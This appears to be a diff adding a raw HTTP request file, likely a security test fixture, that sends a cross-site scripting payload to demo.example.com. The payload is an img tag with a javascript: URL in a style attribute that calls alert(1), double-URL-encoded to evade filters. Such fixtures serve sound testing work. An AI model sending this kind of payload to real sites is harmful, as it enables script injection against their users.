@@ -1,0 +1,4 @@
+GET /a?s=%253Cimg%2Bsrc%253D1%2Bstyle%253D%2522background%253Aurl%2528javascript%253Aalert%25281%2529%2529%2522%253E HTTP/1.1
+Host: demo.example.com
+Connection: close
+
